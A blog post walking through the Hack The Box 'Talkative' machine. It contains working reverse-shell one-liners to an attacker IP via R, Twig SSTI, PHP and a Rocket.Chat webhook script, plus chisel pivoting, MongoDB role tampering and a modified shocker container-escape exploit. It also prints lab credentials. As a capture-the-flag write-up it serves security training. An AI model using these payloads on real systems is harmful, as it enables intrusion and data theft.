---
layout: post
title: "talkative"
date: 2025-10-13
categories: OSCP Playlist
---
# talkative

# Summary

- from wapplyzer, find out bolt cms, search bolt cms strcuture to find login page /bolt
- jamovi allow execution of Rcode; execute reverse shell to get on docker
- find .omv file; transfer back to host to find credentials to bolt cms
- login as admin, we can either get reverse shell from twig or bundle.php; the latter is more stable
- upload static nmap to find host that has ssh open; reuse saul credential to login
- pspy to find mongodb connection to another host; set up chisel local port forward to interact with mongodb on another host
- update mongodb database to make own registered user on rocket chat (port 3000) to role admin; admin have web hooks functions; reverse shell once again on new host
- we are root on docker; linpeas to find capability dac_read_search; exploit using guide from hacktricks to read /root/root.txt

# Attack Path

## nmap scan

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/talkative 10.10.11.155

22/tcp   filtered ssh
80/tcp   open     http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Debian)
|_http-title: Did not follow redirect to http://talkative.htb
3000/tcp filtered ppp
8080/tcp open     http    Tornado httpd 5.0
|_http-title: jamovi
|_http-server-header: TornadoServer/5.0
8081/tcp open     http    Tornado httpd 5.0
|_http-server-header: TornadoServer/5.0
|_http-title: 404: Not Found
8082/tcp open     http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
Service Info: Host: 172.17.0.13
```

We see the web server is Apache, the backend is Debian, the domain name, and an internal host IP. Let’s add the domain name to our /etc/hosts:

```bash
10.10.11.155 talkative.htb
```

## WebPage

### HTTP Port 80

Now let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/talkative/image.png)

![image.png]({{ site.baseurl }}/assets/talkative/image%201.png)

We also get the email naming convention, it’s just first_name@talkative.htb:

```bash
janit@talkative.htb
saul@talkative.htb
matt@talkative.htb
```

Nothing interesting in the source code. Let’s fuzz for subdomains:

```bash
ffuf -u http://10.10.11.155 -H "Host: FUZZ.talkative.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 311
```

We are getting back too many different size, we can’t filter for only success:

```bash
legacy                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 14ms]
reports                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 16ms]
vpn2                    [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 16ms]
host10                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 15ms]
broadcast               [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 27ms]
f                       [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 28ms]
ln                      [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 16ms]
host8                   [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 16ms]
ah                      [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 17ms]
```

Let’s fuzz for subdirectories:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.11.155/FUZZ -ic
```

Same problem arises. 

We know that this is Bolt CMS. Let’s see if we can find out its structure. We find the documentation online:

![image.png]({{ site.baseurl }}/assets/talkative/image%202.png)

Let’s visit /bolt. 

![image.png]({{ site.baseurl }}/assets/talkative/image%203.png)

It’s a login page. Let’s try default credentials:

```bash
admin:admin
```

### Port 3000 Rocket Chat

![image.png]({{ site.baseurl }}/assets/talkative/image%204.png)

We get a rocket chat service. Let’s try to register a new account:

![image.png]({{ site.baseurl }}/assets/talkative/image%205.png)

![image.png]({{ site.baseurl }}/assets/talkative/image%206.png)

We are on the chat, however, there are no active groups or messages. 

### Port 8000 Jamovi

Let’s visit another port:

```bash
http://10.10.11.155:8080
```

![image.png]({{ site.baseurl }}/assets/talkative/image%207.png)

We get a warning for vulnerabilities in this this version of jamovi. Clicking around, we find the current version:

![image.png]({{ site.baseurl }}/assets/talkative/image%208.png)

First, let’s understand what jamovi is:

![image.png]({{ site.baseurl }}/assets/talkative/image%209.png)

We see that we can run R code inside jamovi

![image.png]({{ site.baseurl }}/assets/talkative/image%2010.png)

Let’s search up how to run R code. Searching up R code system command, we get the documentation page:

https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/system

Let’s try running R code with intern set to true, which gives us the output:

```bash
system("whomai", intern = TRUE)

system("whoami 2>&1", intern = TRUE)
```

![image.png]({{ site.baseurl }}/assets/talkative/image%2011.png)

It seems we can run commands. Let’s get a reverse shell back:

```bash
system("bash -c 'sh -i >& /dev/tcp/10.10.16.9/4444 0>&1'", intern = TRUE)
```

Now start a listener:

```bash
nc -lnvp 4444
```

We now have shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png]({{ site.baseurl }}/assets/talkative/image%2012.png)

Looking around, we find a .omv file in root’s dir. Let’s transfer that back to our attack host; nc is not on target:

```bash
#on attack host
nc -lnvp 1234 > bolt-administration.omv

#on target

cat bolt-administration.omv > /dev/tcp/10.10.16.9/1234
```

Now let’s verify file integrity with md5sum:

```bash
md5sum bolt-administration.omv
```

![image.png]({{ site.baseurl }}/assets/talkative/image%2013.png)

It matches. Let’s unzip the archive now:

```bash
unzip bolt-administration.omv

cat xdata.json 
 
{"A": {"labels": [[0, "Username", "Username", false], [1, "matt@talkative.htb", "matt@talkative.htb", false], [2, "janit@talkative.htb", "janit@talkative.htb", false], [3, "saul@talkative.htb", "saul@talkative.htb", false]]}, "B": {"labels": [[0, "Password", "Password", false], [1, "jeO09ufhWD<s", "jeO09ufhWD<s", false], [2, "bZ89h}V<S_DA", "bZ89h}V<S_DA", false], [3, ")SQWGm>9KHEA", ")SQWGm>9KHEA", false]]}, "C": {"labels": []}}          
```

It seems we get password for all three users. Let’s login as saul first since he is the CEO. Going back to the bolt cms:

![image.png]({{ site.baseurl }}/assets/talkative/image%2014.png)

![image.png]({{ site.baseurl }}/assets/talkative/image%2015.png)

None of the username/credentials work. Let’s try putting the username as admin, and try all the passwords; the correct password was matt’s

```bash
jeO09ufhWD<s
```

We are in. If we go on File Management, View & Edit Templates **`themes/base-2021/index.twig` We can try modifying:**

![image.png]({{ site.baseurl }}/assets/talkative/image%2016.png)

Before we can see the changes, let’s also go to Maintenance, and clear the caches. Now visiting the home page, searching for our TESTING string:

![image.png]({{ site.baseurl }}/assets/talkative/image%2017.png)

We find it. Let’s find a twig reverse shell method. First we search PayloadsAllTheThings twig. There is a SSTI page, that mentions twig. If we click on it, find the enumerate the template engine part, there is another link:

![image.png]({{ site.baseurl }}/assets/talkative/image%2018.png)

https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756

Now we search for twig, we find the RCE command in **Out of Band Template Injection Payloads:**

![image.png]({{ site.baseurl }}/assets/talkative/image%2019.png)

![image.png]({{ site.baseurl }}/assets/talkative/image%2020.png)

Let’s change the command to id to verify:

{% highlight bash %}
{{['id']|filter('system')}}

OR WEBSHELL

{{app.request.query.filter('cmd',0,1024,{'options':'system'})}}
{% endhighlight %}

Save changes, and clear the cache, go back to the main page. Searching for id, we find:

![image.png]({{ site.baseurl }}/assets/talkative/image%2021.png)

It works. Let’s get a shell back:

```bash
bash -c 'sh -i >& /dev/tcp/10.10.16.9/4444 0>&1'

{{["bash -c 'sh -i >& /dev/tcp/10.10.16.9/4444 0>&1'"]|filter('system')}}
```

Save changes, and clear the cache, go back to the main page. We now have shell:

![image.png]({{ site.baseurl }}/assets/talkative/image%2022.png)

Another way is to go to Configuration → All configuration Files, Choose bundles.php:

```bash
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.2/4444 0>&1'");
```

![image.png]({{ site.baseurl }}/assets/talkative/image%2023.png)

Save changes. Now refresh the main talkative.php page:

We now have shell. (This is the better way as the site don’t crash after).

Enumerating, we find:

```bash
cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.13     6e23b5a4c301
$ 

```

Let’s do a ping sweep, and see what addresses are up:

```bash
for i in $(seq 254); do ping 172.17.0.$i -c1 -W1 & done | grep from

```

ping is not installed on the target. Let’s try and get a static nmap on the target:

```bash
#on attack
nc -lnvp 1234 < nmap

#on target
bash -c "cat < /dev/tcp/10.10.16.9/1234 > /tmp/nmap"
```

After a while, we can close the connection off on our attack host. Verify file integrity with md5sum:

![image.png]({{ site.baseurl }}/assets/talkative/image%2024.png)

Now let’s scan:

```bash
chmod +x nmap

./nmap -sn 172.17.0.0/24 -v

Nmap scan report for 172.17.0.0 [host down]
Nmap scan report for 172.17.0.1
Host is up (0.00096s latency).
Nmap scan report for 172.17.0.2
Host is up (0.00062s latency).
Nmap scan report for 172.17.0.3
Host is up (0.00054s latency).
Nmap scan report for 172.17.0.4
Host is up (0.00045s latency).
Nmap scan report for 172.17.0.5
Host is up (0.00040s latency).
Nmap scan report for 172.17.0.6
Host is up (0.00034s latency).
Nmap scan report for 172.17.0.7
Host is up (0.00029s latency).
Nmap scan report for 172.17.0.8
Host is up (0.00023s latency).
Nmap scan report for 172.17.0.9
Host is up (0.00014s latency).
Nmap scan report for 172.17.0.10
Host is up (0.000082s latency).
Nmap scan report for 172.17.0.11
Host is up (0.00031s latency).
Nmap scan report for 172.17.0.12
Host is up (0.00016s latency).
Nmap scan report for 6e23b5a4c301 (172.17.0.13)
Host is up (0.00067s latency).
Nmap scan report for 172.17.0.14
Host is up (0.00065s latency).
Nmap scan report for 172.17.0.15
Host is up (0.00058s latency).
Nmap scan report for 172.17.0.16
Host is up (0.00052s latency).
Nmap scan report for 172.17.0.17
Host is up (0.00045s latency).
Nmap scan report for 172.17.0.18
Host is up (0.00043s latency).
Nmap scan report for 172.17.0.19
Host is up (0.00037s latency).
<SNIP>

```

Since we already have logins for saul (CEO), matt and janit, let’s try sshing in:

```bash
ssh saul@172.17.0.1 #jeO09ufhWD<s

$ ssh saul@172.17.0.1
Pseudo-terminal will not be allocated because stdin is not a terminal.
Host key verification failed.

```

We need a TTY shell:

```bash
script /dev/null -c bash
```

Now let’s try again; we are logged in:

![image.png]({{ site.baseurl }}/assets/talkative/image%2025.png)

Let’s start default enumeration; we are not part of any privileged groups.

Let’s get linpeas on the host:

```bash
╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.31

Vulnerable to CVE-2021-3560
```

Polkit seems to be vulnerable. Let’s try to use this exploit to get root: https://www.exploit-db.com/exploits/50011

```bash
dos2unix exploit.sh
```

Now transfer the exploit to target and execute it.

![image.png]({{ site.baseurl }}/assets/talkative/image%2026.png)

It gets stuck on buffering. 

Let’s upload pspy and see what cron jobs are running:

```bash
./pspy64

2025/10/09 18:03:01 CMD: UID=0     PID=4367   | /usr/sbin/CRON -f 
2025/10/09 18:03:01 CMD: UID=0     PID=4370   | /usr/sbin/CRON -f 
2025/10/09 18:03:01 CMD: UID=0     PID=4371   | /usr/sbin/CRON -f 
2025/10/09 18:03:01 CMD: UID=0     PID=4372   | /bin/sh -c cp /root/.backup/shadow /etc/shadow 
2025/10/09 18:03:01 CMD: UID=0     PID=4373   | /bin/sh -c cp /root/.backup/passwd /etc/passwd 
2025/10/09 18:03:01 CMD: UID=0     PID=4375   | /usr/sbin/CRON -f 
2025/10/09 18:03:01 CMD: UID=0     PID=4376   | /bin/sh -c python3 /root/.backup/update_mongo.py 
2025/10/09 18:03:01 CMD: UID=0     PID=4377   | uname -p 

```

It seems like there’s a backup of the shadow file with mongodb. We know mongodb operate over port 27017:

![image.png]({{ site.baseurl }}/assets/talkative/image%2027.png)

However, on the host we are on, we don’t see that port running:

```bash
ss -lntp 

State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process  
LISTEN   0        4096          172.17.0.1:6014          0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6015          0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6000          0.0.0.0:*              
LISTEN   0        4096             0.0.0.0:8080          0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6001          0.0.0.0:*              
LISTEN   0        4096             0.0.0.0:8081          0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6002          0.0.0.0:*              
LISTEN   0        4096             0.0.0.0:8082          0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6003          0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6004          0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6005          0.0.0.0:*              
LISTEN   0        4096       127.0.0.53%lo:53            0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6006          0.0.0.0:*              
LISTEN   0        128              0.0.0.0:22            0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6007          0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6008          0.0.0.0:*              
LISTEN   0        4096           127.0.0.1:3000          0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6009          0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6010          0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6011          0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6012          0.0.0.0:*              
LISTEN   0        4096          172.17.0.1:6013          0.0.0.0:*              
LISTEN   0        4096                [::]:8080             [::]:*              
LISTEN   0        4096                [::]:8081             [::]:*              
LISTEN   0        4096                [::]:8082             [::]:* 
```

If we look at the opening ports after a while (the time it takes for the mongodb cron job runs; we see 

```bash
netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
<SNIP>
tcp        0      0 172.17.0.1:6013         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:33492        172.17.0.2:27017        TIME_WAIT
tcp        0      1 10.10.11.155:42588      1.1.1.1:53              SYN_SENT
tcp        0      0 172.17.0.1:33490        172.17.0.2:27017        TIME_WAIT
tcp        0      0 172.17.0.1:22           172.17.0.13:51558       ESTABLISHED
tcp        0      0 172.17.0.1:22           172.17.0.13:51618       ESTABLISHED
tcp6       0      0 :::8080                 :::*                    LISTEN
tcp6       0      0 :::8081                 :::*                    LISTEN
tcp6       0      0 :::8082                 :::*                    LISTEN

```

The mongodb connection seem to be on port 172.17.0.2

Another way to tell if the port is active is using this bash command, since nc is not available

```bash
echo > /dev/tcp/172.17.0.2/27012; echo $?

0
```

- If the connection is successful (i.e., the port is open and accepting connections), the command echo > /dev/tcp/172.17.0.2/27012 completes without error, and the exit status ($?) is 0.
- In Unix-like systems, an exit status of 0 indicates success, meaning the port is active and reachable.
- If the connection fails (e.g., the port is closed, the host is unreachable, or there's a firewall issue), the command fails, and $? will return a non-zero value (typically 1 or another error code).

However, mongodb commandline tool is not installed onto the target. Let’s use chisel and use our current host as a reverse pivot.

```bash
Chisel is a reverse pivot, our attack box acts as the server

Now to set up chisel:

On our attack host:
./chisel server -p 8110 -reverse -v

On the pivot host:
wget http://10.10.16.2:8002/chisel
chmod +x chisel

./chisel client 10.10.16.2:8110 R:127.0.0.1:27017:172.17.0.2:27017

```

![image.png]({{ site.baseurl }}/assets/talkative/image%2028.png)

Connected. Now let’s search for mongo shell and download from here: [https://www.mongodb.com/try/download/shell](https://www.mongodb.com/try/download/shell)

We also have to download the right version (old, v1.10.6)

```bash
sudo dpkg -i ~/Downloads/
```

Now let’s use mongo shell:

```bash
mongosh
```

![image.png]({{ site.baseurl }}/assets/talkative/image%2029.png)

We are connected. Now let’s enumerate:

```bash
show databases;

admin   104.00 KiB
config  124.00 KiB
local    11.34 MiB
meteor    4.65 MiB

#the non-default is meteor, let's check that out
use meteor;
show collections;

db.users.find();

[
  {
    _id: 'rocket.cat',
    createdAt: ISODate("2021-08-10T19:44:00.224Z"),
    avatarOrigin: 'local',
    name: 'Rocket.Cat',
    username: 'rocket.cat',
    status: 'online',
    statusDefault: 'online',
    utcOffset: 0,
    active: true,
    type: 'bot',
    _updatedAt: ISODate("2021-08-10T19:44:00.615Z"),
    roles: [ 'bot' ]
  },
  {
    _id: 'ZLMid6a4h5YEosPQi',
    createdAt: ISODate("2021-08-10T19:49:48.673Z"),
    services: {
      password: {
        bcrypt: '$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y'
      },
      email: {
        verificationTokens: [
          {
            token: 'dgATW2cAcF3adLfJA86ppQXrn1vt6omBarI8VrGMI6w',
            address: 'saul@talkative.htb',
            when: ISODate("2021-08-10T19:49:48.738Z")
          }
        ]
      },
      resume: { loginTokens: [] }
    },
    emails: [ { address: 'saul@talkative.htb', verified: false } ],
    type: 'user',
    status: 'offline',
    active: true,
    _updatedAt: ISODate("2025-10-11T09:40:12.743Z"),
    roles: [ 'admin' ],
    name: 'Saul Goodman',
    lastLogin: ISODate("2022-03-15T17:06:56.543Z"),
    statusConnection: 'offline',
    username: 'admin',
    utcOffset: 0
  },
  {
    _id: 'eHia6bcMcaeJvHCax',
    createdAt: ISODate("2025-10-11T23:03:31.236Z"),
    services: {
      password: {
        bcrypt: '$2b$10$4ERl87SLLPyxH6/25nCfpOxgEb0Sj.4s10xQS5cc6FnSFF/T7gtWC',
        reset: {
          token: 'fR23_oAaQEsoQeE2U2qHqk6tL1Fjy727pAG9IKLKHZF',
          email: 'bob@talkative.htb',
          when: ISODate("2025-10-11T23:03:33.223Z"),
          reason: 'enroll'
        }
      },
      email: {
        verificationTokens: [
          {
            token: 'O-ME317lmhJLCYKapfv4rLdAe2_EBqLVkgpsJF46al6',
            address: 'bob@talkative.htb',
            when: ISODate("2025-10-11T23:03:31.276Z")
          }
        ]
      },
      resume: {
        loginTokens: [
          {
            when: ISODate("2025-10-11T23:03:31.438Z"),
            hashedToken: '5AQKpXUPQpd49IpXGDKGc1wzkZcF5TljI9ihbqAWwqs='
          }
        ]
      }
    },
    emails: [ { address: 'bob@talkative.htb', verified: false } ],
    type: 'user',
    status: 'online',
    active: true,
    _updatedAt: ISODate("2025-10-11T23:03:33.235Z"),
    roles: [ 'user' ],
    name: 'bob',
    lastLogin: ISODate("2025-10-11T23:03:31.435Z"),
    statusConnection: 'online',
    utcOffset: -4,
    username: 'bob'
  }
]

```

Now, we can either crack the password for Saul, who is an administrator, or, just change the user we had registered in the beginning to admin. We can do that by updating the database. 

```bash
db.users.update({"_id" : "eHia6bcMcaeJvHCax"}, { $set: {"roles" : ["admin"]}})

DeprecationWarning: Collection.update() is deprecated. Use updateOne, updateMany, or bulkWrite.
{
  acknowledged: true,
  insertedId: null,
  matchedCount: 1,
  modifiedCount: 1,
  upsertedCount: 0
}

```

Now if we check again:

```bash
db.users.find();

<SNIP>
    },
    emails: [ { address: 'bob@talkative.htb', verified: false } ],
    type: 'user',
    status: 'away',
    active: true,
    _updatedAt: ISODate("2025-10-11T23:09:27.185Z"),
    roles: [ 'admin' ],
    name: 'bob',
    lastLogin: ISODate("2025-10-11T23:03:31.435Z"),
    statusConnection: 'away',
    utcOffset: -4,
    username: 'bob'
  }

```

Now let’s return to rocket chat.

Searching up rocketchat authenticated administrator rce, we find this github page:

http://github.com/CsEnox/CVE-2021-22911

![image.png]({{ site.baseurl }}/assets/talkative/image%2030.png)

![image.png]({{ site.baseurl }}/assets/talkative/image%2031.png)

```bash
const require = console.log.constructor('return process.mainModule.require')();
const { exec } = require('child_process');
exec("bash -c 'bash -i >& /dev/tcp/10.10.16.2/4445 0>&1'");
```

Let’s turn the following options on, choose outgoing webhook

```bash
Event Trigger: user left room
Enabled: On
Channel: @bob
Post as: bob
URL: http://10.10.16.2
Script Enabled: True
```

![image.png]({{ site.baseurl }}/assets/talkative/image%2032.png)

Now save changes. Now go back to rocket chat, let’s leave room. 

![image.png]({{ site.baseurl }}/assets/talkative/image%2033.png)

We now have shell:

![image.png]({{ site.baseurl }}/assets/talkative/image%2034.png)

Since we are already root on the container, our goal now is to break out the container.

Let’s enumerate the host with linpeas:

```bash
#on attack host
nc -lnvp 8002 < linpeas.sh

#target
cat < /dev/tcp/10.10.16.2/8002 > linpeas.sh
```

Now execute it:

```bash
chmod +x linpeas.sh

./linpeas.sh
```

Interesting finds:

```bash
═╣ Shared mount points ........... ══╣ Capability Checks
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/capabilities-abuse-escape.html
═╣ Dangerous capabilities ......... CapInh: 0000000000000000
CapPrm: 00000000a80425fd
CapEff: 00000000a80425fd
CapBnd: 00000000a80425fd
CapAmb: 0000000000000000
Run capsh --decode=<hex> to decode the capabilities

```

The one we are interested in is CapEff (Capabilities Effective): current active capabilities the process is using right now. We can decode what those capabilities are with capsh on our host machine:

```bash
capsh --decode=00000000a80425fd

0x00000000a80425fd=cap_chown,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap

```

Now, going on the hacktricks site recommended, let’s find if any of our capabilities allow us to escape the container. https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation

We have dav_read_search (same as cap_dac_read_search). 

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables a process to **bypass permissions for reading files and for reading and executing directories**. **This means that you can** **bypass can bypass file read permission checks and directory read/execute permission checks.**

Hacktricks recommend the exploit shocker from this site:

http://stealth.openwall.net/xSports/shocker.c

Now change the following lines; let fd1 open an existing file e.g. /etc/hostname, then change the file we want to read to /root/root.txt

```bash
	read(0, buf, 1);

	// get a FS reference from something mounted in from outside
	if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
		die("[-] open");

	if (find_handle(fd1, "/root/root.txt", &root_h, &h) <= 0)
		die("[-] Cannot find valid handle!");
```

Now compile it on a 20.0.4 Ubuntu:

```bash
gcc -o shocker shocker.c
```

Now let’s transfer the exploit to the host:

```bash
#on attack host
nc -lnvp 8002 < shocker

#target
cat < /dev/tcp/10.10.16.4/8002 > shocker
```

Now execute it:

```bash
chmod +x shocker

./shocker
```

We now have flag:

![image.png]({{ site.baseurl }}/assets/talkative/image%2035.png)